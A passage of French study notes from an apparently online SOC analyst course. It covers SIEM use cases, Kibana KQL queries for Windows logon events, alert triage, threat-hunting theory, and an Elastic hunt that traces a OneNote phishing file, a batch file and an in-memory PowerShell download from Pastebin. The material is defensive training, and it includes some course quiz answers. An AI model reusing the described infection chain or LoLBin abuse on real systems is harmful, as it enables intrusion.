<li>Gère les incidents majeurs, forensics, containment, éradication.</li>
</ul></li>
<li><strong>Threat Intelligence Analyst</strong> :
<ul>
<li>Collecte, analyse et diffuse les indicateurs &amp; TTP adverses.</li>
</ul></li>
<li><strong>Security Engineer</strong> :
<ul>
<li>Maintient l’infra sécurité (EDR, SIEM, firewalls…).</li>
</ul></li>
<li><strong>Compliance &amp; Governance</strong> :
<ul>
<li>S’assure que le SOC et les process respectent les normes (ISO, PCI, etc.).</li>
</ul></li>
<li><strong>Security Awareness &amp; Training</strong> :
<ul>
<li>Forme les utilisateurs, sensibilisation sécurité.</li>
</ul></li>
</ul>
<h3>SOC Stages (maturité)</h3>
<ul>
<li><strong>SOC 1.0</strong>
<ul>
<li>Focalisé réseau/périmètre, outils peu intégrés, alertes isolées.</li>
<li>Encore très réactif et limité face aux attaques multi-vecteurs modernes.</li>
</ul></li>
<li><strong>SOC 2.0</strong> – <strong>approche proactive</strong>
<ul>
<li>Intègre <strong>télémétrie</strong>, threat intel, analyse de flux réseau, anomalies.</li>
<li>Utilise Layer 7, corrélation avancée, partage d’info entre SOCs.</li>
<li>Préparation pré-incident : vuln management, config management, risk management dynamique.</li>
<li>Post-incident : IR, forensics, amélioration continue.</li>
</ul></li>
<li><strong>Cognitive SOC (next-gen)</strong>
<ul>
<li>Ajout de <strong>systèmes de machine learning / AI</strong> pour combler les gaps d’expérience.</li>
<li>Collaboration renforcée entre métier et sécurité, procédures IR plus matures.</li>
</ul></li>
</ul>
<h2>MITRE ATT&amp;CK &amp; opérations de sécurité</h2>
<h3>MITRE ATT&amp;CK, c’est quoi ?</h3>
<ul>
<li>Un framework qui recense les <strong>tactiques, techniques et procédures (TTP)</strong> des attaquants.</li>
<li>Organisé en <strong>matrices</strong> selon le contexte : Enterprise, Mobile, Cloud…</li>
<li>Chaque <strong>tactic</strong> = objectif (p. ex. Execution, Persistence, Exfiltration).
Chaque <strong>technique</strong> = méthode concrète.</li>
</ul>
<h3>Use cases MITRE en SOC</h3>
<ul>
<li><strong>Détection &amp; réponse</strong> :
<ul>
<li>Mapper les règles et alertes aux TTP MITRE pour couvrir un max d’étapes du kill chain.</li>
</ul></li>
<li><strong>Évaluation et gap analysis</strong> :
<ul>
<li>Vérifier quelles techniques on sait détecter, lesquelles sont encore un “blind spot”.</li>
</ul></li>
<li><strong>Maturité SOC</strong> :
<ul>
<li>Mesurer la capacité du SOC à détecter/répondre aux TTP sur la matrice.</li>
</ul></li>
<li><strong>Threat Intelligence &amp; enrichment</strong> :
<ul>
<li>Langage commun pour décrire les comportements adverses.</li>
<li>Enrichir les IOC avec des infos TTP.</li>
</ul></li>
<li><strong>Behavioral analytics</strong> :
<ul>
<li>Mapper les TTP à des comportements d’utilisateurs/systèmes.</li>
</ul></li>
<li><strong>Red Team / Pentest</strong> :
<ul>
<li>Utiliser MITRE ATT&amp;CK comme “catalogue” de techniques à simuler.</li>
</ul></li>
<li><strong>Formation</strong> :
<ul>
<li>Excellent support pédagogique pour apprendre les techniques d’attaquants.</li>
</ul></li>
</ul>
<h2>Développement de SIEM Use Cases</h2>
<h3>Qu’est-ce qu’un SIEM use case ?</h3>
<p>Un <strong>use case</strong> = scénario précis que le SIEM doit détecter.</p>
<p>Exemples :</p>
<ul>
<li>Simple :
<ul>
<li>Brute force → 10 échecs de login pour un utilisateur en 4 minutes.</li>
</ul></li>
<li>Complexe :
<ul>
<li>Ransomware (combinaison de multiples signaux : volumes de fichiers modifiés, process suspects, connexions réseau inhabituelles…).</li>
</ul></li>
</ul>
<h3>Cycle de vie d’un use case</h3>
<ol>
<li><strong>Requirements</strong>
<ul>
<li>Qu’est-ce qu’on veut détecter ?</li>
<li>Qui propose : client, analyste, management…</li>
<li>Exemple : “Brute force AD : alerte après 10 login failed en 4 minutes”.</li>
</ul></li>
<li><strong>Data Points</strong>
<ul>
<li>Où se produisent les authentifications ? Windows, Linux, VPN, OWA, apps, etc.</li>
<li>Quelles sources de logs couvrent ces points ?</li>
</ul></li>
<li><strong>Log Validation</strong>
<ul>
<li>Vérifier que les logs contiennent : user, timestamp, source, dest, machine, app…</li>
<li>Vérifier que tous les chemins d’authentification remontent bien dans le SIEM.</li>
</ul></li>
<li><strong>Design &amp; Implementation</strong>
<ul>
<li>Définir le <strong>conditionnel</strong>, l’<strong>agrégation</strong> (par IP, par user…), la <strong>priorité</strong>.</li>
<li>Éviter les faux positifs (ex : service accounts, scanners internes, etc.).</li>
</ul></li>
<li><strong>Documentation (SOP)</strong>
<ul>
<li>Que doit faire l’analyste quand l’alerte tombe ?</li>
<li>Escalation matrix, contacts, étapes d’investigation.</li>
</ul></li>
<li><p><strong>Onboarding</strong></p>
<ul>
<li>D’abord en dev/test, puis en prod.</li>
<li>Collecte de feedback, ajustement.</li>
</ul>
<ol>
<li><strong>Fine-tuning</strong>
<ul>
<li>Ajustement de la sévérité.</li>
</ul></li>
</ol>
<h3>Exemples basés sur MSBuild</h3>
<h3>Exemple 1 – MSBuild lancé par une application Office</h3>
<ul>
<li>Risque : <strong>LoLBins</strong> (Living off the Land Binaries).</li>
<li>Use case : détecter <strong>MSBuild</strong> lancé par Word/Excel, ce qui peut indiquer exécution de code malveillant.</li>
<li>MITRE mapping :
<ul>
<li>Tactic <strong>Defense Evasion (TA0005)</strong></li>
<li>Technique <strong>Trusted Developer Utilities Proxy Execution (T1127)</strong></li>
<li>Sub-technique <strong>T1127.001 – MSBuild</strong></li>
<li>Tactic <strong>Execution (TA0002)</strong> aussi.</li>
</ul></li>
</ul>
<p>Sévérité : <strong>HIGH</strong>, car c’est rare et très suspect.</p>
<h3>Exemple 2 – MSBuild qui initie des connexions réseau</h3>
<ul>
<li>Focus ici : MSBuild qui fait un <strong>outbound network connection</strong>.</li>
<li>Problème : peut aussi pointer vers des IP légitimes (updates Microsoft).</li>
<li>Donc plus de risque de faux positifs → <strong>sévérité MEDIUM</strong>.</li>
<li>Investigation : se concentrer sur <code>event.action</code>, IP cible, réputation IP, contexte utilisateur, etc.</li>
</ul>
<h2>Visualisations SIEM dans Kibana (pratique)</h2>
<h3>Failed logon attempts – All users</h3>
<p>Objectif : visualiser les <strong>échecs de logon (4625)</strong> pour tous les utilisateurs.</p>
<p><strong>Étapes principales :</strong></p>
<ol>
<li>Aller sur <code>Dashboard</code> → créer un nouveau dashboard.</li>
<li>Créer une <strong>visualisation</strong> → type <strong>Table</strong>.</li>
<li>Time picker → <strong>Last 15 years</strong> (pour couvrir toutes les données).</li>
<li>Index pattern : <code>windows*</code>.</li>
<li><p>Ajouter un <strong>filtre</strong> :</p>
<div class="codehilite"><pre><code>event.code: 4625

</code></pre></div></li>
<li><p>Dans la Table :</p>
<ul>
<li>Rows : <code>user.name.keyword</code> → alias <strong>Username</strong>.</li>
<li>Rows : <code>host.hostname.keyword</code> → alias <strong>Event logged by</strong>.</li>
<li>Rows : <code>winlog.logon.type.keyword</code> → alias <strong>Logon Type</strong>.</li>
<li>Metrics : <code>Count</code> → alias <strong># of logins</strong>.</li>
<li>Trier les résultats par <strong># of logins</strong> décroissant.</li>
</ul></li>
<li><p>Exclure :</p>
<ul>
<li>Certains “usernames” qui sont en fait des noms de machines (ex : <code>DESKTOP-…</code>).</li>
<li>Toutes les <strong>computer accounts</strong> (AD) qui finissent par <code>$</code> :
<div class="codehilite"><pre><code>NOT user.name: *$
AND winlog.channel.keyword: Security

</code></pre></div></li>
</ul></li>
<li><p>Donner un <strong>titre</strong> à la visualisation (ex : <em>Failed logon attempts [All users]</em>), puis sauver le dashboard.</p></li>
</ol>
<blockquote>
<p>Question pratique associée : chercher dans cette table le nombre de logins (count) pour le compte sql-svc1.</p>
</blockquote>
<h3>Failed logon attempts – Disabled users</h3>
<p>Objectif : visualiser les échecs de logon <strong>spécifiquement sur des comptes désactivés</strong>.</p>
<p><strong>Filtrage :</strong></p>
<ul>
<li><code>event.code: 4625</code> (failed logon)</li>
<li><code>winlog.event_data.SubStatus: 0xC0000072</code> (account disabled)</li>
</ul>
<p>Visualisation type Table :</p>
<ul>
<li>Rows :
<ul>
<li><code>user.name.keyword</code> → disabled user</li>
<li><code>host.hostname.keyword</code> → machine de logon</li>
<li><code>winlog.logon.type.keyword</code> → Logon Type</li>
</ul></li>
<li>Metrics :
<ul>
<li><code>Count</code> → nombre de tentatives</li>
</ul></li>
</ul>
<blockquote>
<p>Question associée : trouver le Logon Type présent dans le document retourné.</p>
</blockquote>
<p>Deuxième question : failed logon sur <strong>admin users only</strong> (user contient “admin”).</p>
<p>KQL :</p>
<div class="codehilite"><pre><code>user.name: *admin*

</code></pre></div>
<p><em>(pattern “contient admin n’importe où dans le nom”)</em></p>
<h3>Successful RDP logon – Service accounts</h3>
<p>Objectif : détecter les <strong>logons RDP réussis</strong> utilisant des <strong>comptes de service</strong>, ce qui ne devrait jamais arriver en prod.</p>
<p>Justice côté logs :</p>
<ul>
<li>Windows event <code>4624</code> → logon réussi.</li>
<li>Logon Type = <code>RemoteInteractive</code> → RDP.</li>
</ul>
<p><strong>Filtres :</strong></p>
<ul>
<li><code>event.code: 4624</code></li>
<li><code>winlog.logon.type: RemoteInteractive</code></li>
</ul>
<p><strong>KQL pour restreindre aux service accounts</strong> (commencent par <code>svc-</code>) :</p>
<div class="codehilite"><pre><code>user.name: svc-*

</code></pre></div>
<p>Table :</p>
<ul>
<li><code>user.name.keyword</code> → service account</li>
<li><code>host.hostname.keyword</code> → machine cible (serveur RDP)</li>
<li><code>related.ip.keyword</code> → IP de la machine initiatrice</li>
<li>metric Count → nombre de logons.</li>
</ul>
<blockquote>
<p>Question associée : récupérer l’IP dans related.ip.keyword.</p>
</blockquote>
<h3>Users ajoutés / supprimés du groupe Administrators</h3>
<p>Objectif : suivre les <strong>modifications du groupe local Administrators</strong> depuis le <strong>05/03/2023</strong> jusqu’à aujourd’hui.</p>
<p>Événements :</p>
<ul>
<li><code>4732</code> : ajout à un groupe local sécurisé.</li>
<li><code>4733</code> : suppression d’un membre du groupe local sécurisé.</li>
</ul>
<p><strong>Filtres :</strong></p>
<ul>
<li><code>event.code: 4732 or 4733</code></li>
<li><code>group.name: "Administrators"</code></li>
</ul>
<p>Table – Rows :</p>
<ul>
<li><code>user.name.keyword</code> → qui fait l’action</li>
<li><code>winlog.event_data.MemberSid.keyword</code> → quel user est ajouté/retiré</li>
<li><code>group.name.keyword</code> → quel groupe (vérifier “Administrators”)</li>
<li><code>event.action.keyword</code> → add/remove</li>
<li><code>host.name.keyword</code> → machine locale</li>
</ul>
<p>Metrics : <code>Count</code> sur le nombre d’événements.</p>
<p>Puis, on restreint la <strong>période de temps</strong> (time picker):</p>
<ul>
<li>From : <code>2023-03-05</code></li>
<li>To : date actuelle (ou autre plage absolue).</li>
</ul>
<blockquote>
<p>Question associée : toutes les entrées retournées se produisent le même jour → donner cette date au format 20XX-0X-0X.</p>
</blockquote>
<h2>Processus de triage d’alertes</h2>
<p>Le module donne une vue “idéale” du <strong>triage d’alertes</strong> en SOC.</p>
<h3>Étapes principales</h3>
<ol>
<li><strong>Initial Alert Review</strong>
<ul>
<li>Lire l’alerte : règle qui a matché, time, src/dst, système impacté, sévérité.</li>
<li>Regarder les logs associés dans le SIEM pour le contexte.</li>
</ul></li>
<li><strong>Classification de l’alerte</strong>
<ul>
<li>Basée sur : sévérité, impact potentiel, urgence.</li>
<li>Utiliser la grille de classification interne (Low/Medium/High/Critical).</li>
</ul></li>
<li><strong>Corrélation</strong>
<ul>
<li>Voir s’il y a d’autres alertes ou événements liés (même IP, même host, même user).</li>
<li>Chercher dans le SIEM d’autres événements autour du même moment.</li>
<li>S’appuyer sur la <strong>threat intel</strong> pour IP/domain/process suspects.</li>
</ul></li>
<li><strong>Enrichissement</strong>
<ul>
<li>Récupérer des infos supplémentaires : PCAP, dumps, fichiers suspects…</li>
<li>Analyser fichiers/URLs/IPs (sandbox, VT, outils internes).</li>
<li>Vérifier process, connexions réseau, fichiers modifiés sur la machine impactée.</li>
</ul></li>
<li><strong>Risk Assessment</strong>
<ul>
<li>Quelle est la criticité du système impacté ?</li>
<li>Données sensibles / contraintes réglementaires ?</li>
<li>Risque de <strong>lateral movement</strong> ?</li>
</ul></li>
<li><strong>Contextual Analysis</strong>
<ul>
<li>Comprendre le contexte métier : est-ce une activité normale ?</li>
<li>Regarder les protections déjà en place (FW, EDR, IDS…) et s’il y a contournement.</li>
<li>Intégrer les contraintes <strong>compliance</strong> (ex : impact GDPR).</li>
</ul></li>
<li><strong>Incident Response Planning</strong>
<ul>
<li>Si l’alerte est réelle et significative → déclencher le plan IR.</li>
<li>Documenter : systèmes, IOCs, comportements observés.</li>
<li>Assigner des rôles, coordonner avec les autres équipes (ops, admins, réseau).</li>
</ul></li>
<li><strong>Consultation avec IT Operations</strong>
<ul>
<li>Vérifier s’il y a eu des changes/maintenance qui expliquent l’alerte.</li>
<li>Identifier les misconfigurations ou activités légitimes qui ressemblent à de l’attaque.</li>
</ul></li>
<li><strong>Response Execution</strong>
<ul>
<li>Si faux positif → documenter et éventuellement tuner la règle.</li>
<li>Si vrai positif → containment, éradication, récupération.</li>
</ul></li>
<li><strong>Escalade</strong>
<ul>
<li>Triggers : systèmes critiques compromis, attaque active, technique inconnue, large impact, suspicion d’insider, etc.</li>
<li>Escalader vers management, IR dirigeants, voire entités externes (CERT, police) si requis.</li>
</ul></li>
<li><strong>Continuous Monitoring</strong>
<ul>
<li>Suivre l’incident, fournir des updates, vérifier pas de ré-apparition.</li>
</ul></li>
<li><strong>De-escalation &amp; Lessons learned</strong>
<ul>
<li>Quand le risque est maîtrisé, clore/abaisser la priorité.</li>
<li>Faire un <strong>retour d’expérience</strong> (post-mortem) et mettre à jour règles/procédures.</li>
</ul></li>
</ol>
<h2>Ce que j’ai appris / à retenir pour la pratique SOC</h2>
<ul>
<li>Un <strong>SIEM</strong>, ce n’est pas juste un “super syslog” :
<ul>
<li>c’est un outil de <strong>corrélation</strong>, de <strong>détection avancée</strong> et de <strong>compliance</strong>.</li>
</ul></li>
<li>L’<strong>Elastic Stack</strong> est un SIEM open-source très puissant :
<ul>
<li>Elasticsearch pour la recherche,</li>
<li>Logstash pour les pipelines,</li>
<li>Kibana pour la visualisation,</li>
<li>Beats pour la collecte.</li>
</ul></li>
<li><strong>KQL</strong> est indispensable pour un analyste SOC :
<ul>
<li>filtres sur <code>event.code</code>, <code>user.name</code>, <code>winlog.event_data.*</code>, <code>@timestamp</code>, etc.</li>
<li>wildcards (<code>admin*</code>, <code>svc-*</code>), comparaisons et combinaisons logiques.</li>
</ul></li>
<li>L’<strong>ECS</strong> permet d’unifier les logs et d’écrire des règles portables entre sources.</li>
<li>Le SOC moderne (SOC 2.0 et +) doit être <strong>proactif</strong>, pas seulement réactif :
<ul>
<li>threat hunting, intelligence, préparation pré-incident, forensics post-incident.</li>
</ul></li>
<li><strong>MITRE ATT&amp;CK</strong> est un langage commun pour décrire et couvrir les TTP adverses :
<ul>
<li>utile pour écrire des use cases, faire du gap analysis et guider les red team.</li>
</ul></li>
<li>Un bon <strong>SIEM use case</strong> passe toujours par :
<ul>
<li>des requirements clairs,</li>
<li>une bonne compréhension des <strong>data points</strong>,</li>
<li>une validation des logs,</li>
<li>un SOP documenté,</li>
<li>du fine-tuning continu.</li>
</ul></li>
<li>Les exemples <strong>MSBuild / LoLBins</strong> montrent comment transformer une “connaissance offensive” en règle de détection structurée (avec mapping MITRE, sévérité, TTD/TTR…).</li>
<li>Les visualisations Kibana (failed logons, disabled accounts, RDP service accounts, admins group modifications) sont des <strong>cas très réalistes</strong> qu’on retrouve en entreprise.</li>
<li>Le <strong>triage d’alertes</strong> est un vrai processus méthodique, pas juste “regarder les logs” :
<ul>
<li>classification, corrélation, enrichissement, risk assessment, escalade, IR.</li>
</ul></li>
</ul></li>
</ol>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Threat Hunting &amp; Hunting With Elastic</strong></summary><div class="indented"><h2>Threat Hunting Fundamentals</h2>
<p><figure class="image"><a href="../static/image/cjca/cti.png"><img alt="" src="../static/image/cjca/cti.png"/></a></figure></p>
<h3>Définition &amp; objectifs</h3>
<ul>
<li>Le <strong>dwell time</strong> (temps entre compromission et détection) se compte souvent en <strong>semaines</strong> voire en <strong>mois</strong>.</li>
<li>Le modèle purement <strong>réactif</strong> (attendre les alertes / signatures / AV) n’est plus suffisant.</li>
<li>Le <strong>threat hunting</strong> = activité <strong>humaine</strong>, <strong>proactive</strong>, souvent <strong>guidée par des hypothèses</strong>, qui consiste à fouiller les données (logs, flux réseau, endpoints…) pour trouver :
<ul>
<li>des <strong>menaces avancées</strong>,</li>
<li>qui <strong>échappent</strong> aux détections automatiques.</li>
</ul></li>
</ul>
<p>Usage :</p>
<ul>
<li><strong>Proactif</strong> : on part d’une hypothèse, de TTPs ou de nouvelle CTI.</li>
<li><strong>Réactif</strong> : on investigue <strong>plus loin</strong> suite à un incident ou une alerte confirmée.</li>
</ul>
<blockquote>
<p>Le module insiste bien : le threat hunting est utilisé proactivement et réactivement.</p>
</blockquote>
<h3>Lien avec l’Incident Handling</h3>
<p>Le threat hunting s’insère dans les phases classiques de gestion d’incident :</p>
<ol>
<li><strong>Preparation</strong>
<ul>
<li>Définir les <strong>règles d’engagement</strong>, responsabilités, périmètre.</li>
<li>Intégrer le hunting dans les <strong>processus IR existants</strong> (politiques, procédures).</li>
</ul></li>
<li><strong>Detection &amp; Analysis</strong>
<ul>
<li>Le hunter aide à confirmer si des IoCs = vrai incident ou faux positif.</li>
<li>Il cherche des <strong>artéfacts supplémentaires</strong> et d’éventuelles compromissions cachées.</li>
</ul></li>
<li><strong>Containment / Eradication / Recovery</strong>
<ul>
<li>Selon l’orga, les hunters peuvent <strong>participer</strong> à ces étapes (pas systématique, dépend des procédures internes).</li>
</ul></li>
<li><strong>Post-Incident Activity</strong>
<ul>
<li>Les hunters apportent leur vision globale IT / sécurité pour :
<ul>
<li>recommander des améliorations,</li>
<li>renforcer la posture globale.</li>
</ul></li>
</ul></li>
</ol>
<p>Conclusion : <strong>Incident handling</strong> et <strong>threat hunting</strong> peuvent être <strong>intégrés</strong> ou séparés, mais <strong>pas “toujours indépendants”</strong>.</p>
<h3>Quand chasser ?</h3>
<p>Moments clés où lancer une chasse :</p>
<ul>
<li><strong>Nouvelle vulnérabilité / nouvel acteur</strong> ciblant nos technos.</li>
<li><strong>Nouveaux IoCs</strong> associés à un adversaire qui vise notre secteur.</li>
<li><strong>Multiples anomalies réseau</strong> ou événements corrélés suspects.</li>
<li><strong>Pendant un incident IR</strong> : pour cartographier toute l’étendue de la compromission.</li>
<li><strong>De façon périodique</strong> : hunting <strong>proactif régulier</strong>.</li>
</ul>
<blockquote>
<p>Idée centrale : le meilleur moment pour chasser, c’est maintenant – ne pas attendre une alerte.</p>
</blockquote>
<h3>Structure d’une équipe de threat hunting</h3>
<p>Rôles typiques :</p>
<ul>
<li><strong>Threat Hunter</strong> : mène la chasse, connaît TTPs, kill chain, outils de hunting.</li>
<li><strong>Threat Intelligence Analyst</strong> : collecte &amp; analyse CTI (OSINT, dark web, feeds…).</li>
<li><strong>Incident Responders</strong> : prennent le relais pour containment / eradication / recovery.</li>
<li><strong>Forensic Experts (DFIR)</strong> : reverse malware, analyse artefacts, rapports poussés.</li>
<li><strong>Data Analysts / Data Scientists</strong> : modèles, ML, stats sur gros volumes de logs.</li>
<li><strong>Security Engineers / Architects</strong> : design infra, intègrent les outils de hunting &amp; défenses.</li>
<li><strong>Network Security Analyst</strong> : compréhension fine des flux &amp; comportements réseau.</li>
<li><strong>SOC Manager</strong> : coordination, reporting, priorisation des efforts.</li>
</ul>
<h2>Threat Hunting Process</h2>
<p>Le module décrit un cycle de chasse générique :</p>
<ol>
<li><strong>Setting the Stage (Préparation)</strong>
<ul>
<li>Comprendre le <strong>contexte métier</strong>, les <strong>actifs critiques</strong> (crown jewels).</li>
<li>S’assurer que :
<ul>
<li>les <strong>logs sont activés</strong> (Sysmon, PowerShell, Zeek, etc.),</li>
<li>les outils (SIEM, EDR, IDS) sont bien configurés.</li>
</ul></li>
<li>Se tenir à jour de la <strong>CTI</strong> et des profils d’attaquants.</li>
</ul></li>
<li><strong>Formulating Hypotheses</strong>
<ul>
<li>Formuler des hypothèses <strong>testables</strong>, basées sur :
<ul>
<li>CTI récente,</li>
<li>alertes existantes,</li>
<li>intuition / expérience.</li>
</ul></li>
<li>Exemple : <em>« Un APT exploite une vulnérabilité web pour établir un C2 »</em>.</li>
</ul></li>
<li><strong>Designing the Hunt</strong>
<ul>
<li>Choisir :
<ul>
<li>les <strong>sources de données</strong> (logs web, DNS, PowerShell, endpoints…),</li>
<li>les <strong>outils</strong> (KQL, scripts, frameworks),</li>
<li>les <strong>IoCs / patterns</strong> à rechercher.</li>
</ul></li>
<li>Écrire des <strong>queries</strong> et scripts de hunting.</li>
</ul></li>
<li><strong>Data Gathering &amp; Examination</strong>
<ul>
<li>Collecter / filtrer / corréler les événements.</li>
<li>Itérer :
<ul>
<li>on raffine l’hypothèse ou la zone de recherche au fur et à mesure.</li>
</ul></li>
</ul></li>
<li><strong>Evaluating Findings &amp; Testing Hypotheses</strong>
<ul>
<li>Confirmer ou infirmer l’hypothèse.</li>
<li>Identifier les systèmes impactés, le niveau de compromission, le risque.</li>
</ul></li>
<li><strong>Mitigating Threats</strong>
<ul>
<li>Si menace confirmée :
<ul>
<li>isoler les machines,</li>
<li>supprimer malwares / backdoors,</li>
<li>patch / durcissement,</li>
<li>ajuster règles (FW, EDR, SIEM…).</li>
</ul></li>
</ul></li>
<li><strong>After the Hunt</strong>
<ul>
<li>Documenter :
<ul>
<li>ce qui a été fait, trouvé, appris.</li>
</ul></li>
<li>Mettre à jour :
<ul>
<li>règles de détection,</li>
<li>playbooks IR,</li>
<li>CTI interne.</li>
</ul></li>
</ul></li>
<li><strong>Continuous Learning</strong>
<ul>
<li>Chaque chasse alimente la suivante :
<ul>
<li>nouveaux TTPs,</li>
<li>nouveaux dashboards / requêtes réutilisables.</li>
</ul></li>
</ul></li>
</ol>
<blockquote>
<p>Point clé : les hypothèses doivent être testables → répondre “ False ” à “It is OK to formulate hypotheses that are not testable”.</p>
</blockquote>
<h2>Threat Hunting Glossary &amp; Threat Intel</h2>
<h3>Quelques définitions clés</h3>
<ul>
<li><strong>Adversary</strong> : acteur malveillant (cybercriminel, insider, hacktiviste, APT…).</li>
<li><strong>APT</strong> : groupe disposant de moyens importants, objectif long terme, persistance élevée (mais pas forcément “techniquement ultra avancé”).</li>
<li><strong>TTPs (Tactics, Techniques, Procedures)</strong> :
<ul>
<li><strong>Tactics</strong> : <em>pourquoi</em> (objectif haut niveau).</li>
<li><strong>Techniques</strong> : <em>comment</em> (méthodes).</li>
<li><strong>Procedures</strong> : <em>recette détaillée</em> (commandes, scripts…).</li>
</ul></li>
<li><strong>Indicator</strong> = <strong>donnée technique + contexte</strong> → sans contexte, un IP ou un hash brut a peu de valeur.</li>
<li><strong>Threat</strong> = combinaison de :
<ul>
<li><strong>Intent</strong> (motivation),</li>
<li><strong>Capability</strong> (moyens / skills),</li>
<li><strong>Opportunity</strong> (surface d’attaque exposée).</li>
</ul></li>
<li><strong>Campaign</strong> : ensemble d’incidents partageant mêmes TTPs / objectifs.</li>
</ul>
<h3>Pyramid of Pain</h3>
<p>Hiérarchie des indicateurs (du plus facile au plus dur à changer pour l’attaquant) :</p>
<ol>
<li><strong>Hash values</strong> – trivial à changer.</li>
<li><strong>IP addresses</strong> – facile (VPN, proxies, TOR…).</li>
<li><strong>Domain names</strong> – DGAs, DNS dynamique, etc.</li>
<li><strong>Network / Host Artifacts</strong> – plus durs à modifier sans casser l’attaque.</li>
<li><strong>Tools</strong> – changer de framework / malware coûte plus cher.</li>
<li><strong>TTPs</strong> – sommet de la pyramide : forcer un groupe à changer ses TTP a un <strong>coût énorme</strong> pour lui.</li>
</ol>
<p>Idée : viser le plus haut possible dans la pyramide pour augmenter le <strong>“pain”</strong> côté attaquant.</p>
<h3>Diamond Model</h3>
<p>4 sommets :</p>
<ul>
<li><strong>Adversary</strong></li>
<li><strong>Capability</strong> (outils, TTPs)</li>
<li><strong>Infrastructure</strong> (serveurs, domaines, IP)</li>
<li><strong>Victim</strong></li>
</ul>
<p>On étudie les relations entre ces 4 éléments pour mieux comprendre et prédire les intrusions.</p>
<h3>Cyber Threat Intelligence (CTI)</h3>
<p>4 critères pour une CTI utile :</p>
<ol>
<li><strong>Relevance</strong> – pertinent pour <strong>notre</strong> orga.</li>
<li><strong>Timeliness</strong> – information <strong>fraîche</strong>.</li>
<li><strong>Actionability</strong> – qui mène à une <strong>action concrète</strong> (règle, blocage, hunt…).</li>
<li><strong>Accuracy</strong> – vérifiée / sourcée ; sinon marquée avec un <strong>niveau de confiance</strong>.</li>
</ol>
<p>CTI ≠ “balance un IP tout seul au SOC” :</p>
<ul>
<li>Un <strong>IP sans contexte</strong>, c’est <strong>inutile</strong> (donc répondre “False” à <em>“It’s useful for the CTI team to provide a single IP with no context to the SOC team”</em>).</li>
</ul>
<p>3 niveaux de CTI :</p>
<ul>
<li><strong>Stratégique</strong> : pour direction / C-level (Who? Why? vision long terme).</li>
<li><strong>Opérationnelle</strong> : campagnes, TTPs, “How? Where?”.</li>
<li><strong>Tactique</strong> : IoCs concrets (hash, IP, domaines, chemins…).</li>
</ul>
<h3>CTI vs Threat Hunting</h3>
<ul>
<li><strong>Threat Intelligence (prévisionnel)</strong> :
<ul>
<li>Prédit où/qui/quand/comment l’adversaire va attaquer.</li>
</ul></li>
<li><strong>Threat Hunting (réactif + proactif)</strong> :
<ul>
<li>Part d’un incident / d’une info pour vérifier s’il y a présence de l’adversaire dans le SI.</li>
</ul></li>
</ul>
<p>Les deux se nourrissent mutuellement :</p>
<ul>
<li>La CTI guide les hypothèses de hunting.</li>
<li>Le hunting enrichit la CTI avec de nouveaux IoCs / TTPs.</li>
</ul>
<h2>Cas pratique : Hunting for Stuxbot avec Elastic Stack</h2>
<h3>Environnement</h3>
<ul>
<li>SIEM : <strong>Elastic Stack / Kibana</strong></li>
<li>Index :
<ul>
<li><code>windows*</code> : logs Windows + Sysmon + PowerShell.</li>
<li><code>zeek*</code> : logs réseau (DNS, connexions…).</li>
</ul></li>
<li>Contexte :
<ul>
<li>Petite boîte (~200 users), usage surtout bureautique, Gmail via navigateur, Edge par défaut.</li>
</ul></li>
</ul>
<h3>Hypothèse initiale</h3>
<p>À partir du rapport CTI Stuxbot :</p>
<ul>
<li>Initial access → <strong>phishing</strong> avec un faux fichier <strong>OneNote “invoice.one”</strong>.</li>
<li>L’idée : vérifier si un tel fichier apparaît dans l’environnement et remonter toute la chaîne d’attaque.</li>
</ul>
<h3>4.2.1. Détection du téléchargement <code>invoice.one</code></h3>
<p>KQL :</p>
<div class="codehilite"><pre><code>event.code:15 AND file.name:*invoice.one

</code></pre></div>
<ul>
<li><code>event.code:15</code> = <strong>Sysmon Event ID 15</strong> (<em>FileCreateStreamHash</em>, souvent lié aux téléchargements via navigateur).</li>
<li>On trouve :
<ul>
<li>fichier <code>invoice.one</code>,</li>
<li>téléchargé par <strong>MSEdge</strong>,</li>
<li>sur la machine <strong>WS001</strong>,</li>
<li>utilisateur <strong>Bob</strong>,</li>
<li>à la date clé (26/03/2023 vers 22:05:47).</li>
</ul></li>
</ul>
<p>Confirmation via création de fichier :</p>
<div class="codehilite"><pre><code>event.code:11 AND file.name:invoice.one*

</code></pre></div>
<p>(<code>event.code:11</code> = Sysmon <strong>FileCreate</strong>)</p>
<h3>Pivot réseau : Zeek DNS &amp; connexions</h3>
<p>On connaît l’IP de WS001 (ex : <code>192.168.28.130</code>).</p>
<p>DNS vus par Zeek :</p>
<div class="codehilite"><pre><code>source.ip:192.168.28.130 AND dns.question.name:*

</code></pre></div>
<p>On filtre le bruit (Google, analytics, etc.) et on se concentre :</p>
<ul>
<li>Accès à <strong>mail.google.com</strong>,</li>
<li>Puis à un site de <strong>file hosting</strong> (<code>file.io</code>),</li>
<li>Puis requêtes vers <code>nav-edge.smartscreen.microsoft.com</code> (Defender SmartScreen, typique après download).</li>
</ul>
<p>En regardant les IPs résolues (<code>dns.answers.data</code>), on retrouve les IPs du hosting, puis on cherche les connexions TCP vers ces IPs pendant la même fenêtre temporelle → confirmation que <strong>Bob a bien téléchargé <code>invoice.one</code> depuis un file hosting</strong>.</p>
<h3>Ouverture du OneNote &amp; exécution du batch</h3>
<p>On veut maintenant voir ce qui s’est passé après ouverture de <code>invoice.one</code>.</p>
<h3>Ouverture du fichier OneNote</h3>
<div class="codehilite"><pre><code>event.code:1 AND process.command_line:*invoice.one*

</code></pre></div>
<ul>
<li><code>event.code:1</code> = <strong>Sysmon Process Create</strong>.</li>
<li>On voit <strong>ONENOTE.EXE</strong> lancer ce fichier ~6 s après le download.</li>
</ul>
<h3>Processus enfants de OneNote</h3>
<div class="codehilite"><pre><code>event.code:1 AND process.parent.name:"ONENOTE.EXE"

</code></pre></div>
<p>On obtient :</p>
<ul>
<li>Un process <strong>OneNoteM.exe</strong> (composant légitime),</li>
<li>Un <strong>cmd.exe</strong> qui exécute un batch <strong><code>invoice.bat</code></strong> depuis un répertoire temporaire (attachement intégré dans la page OneNote).</li>
</ul>
<h3>PowerShell dropper depuis Pastebin</h3>
<p>On cherche maintenant ce que fait <code>invoice.bat</code> :</p>
<div class="codehilite"><pre><code>event.code:1 AND process.parent.command_line:*invoice.bat*

</code></pre></div>
<p>Résultat :</p>
<ul>
<li>Lancement de <strong>PowerShell</strong> avec une ligne de commande suspicieuse qui :
<ul>
<li>télécharge un script depuis <strong>Pastebin</strong>,</li>
<li>l’exécute en mémoire.</li>
</ul></li>
</ul>
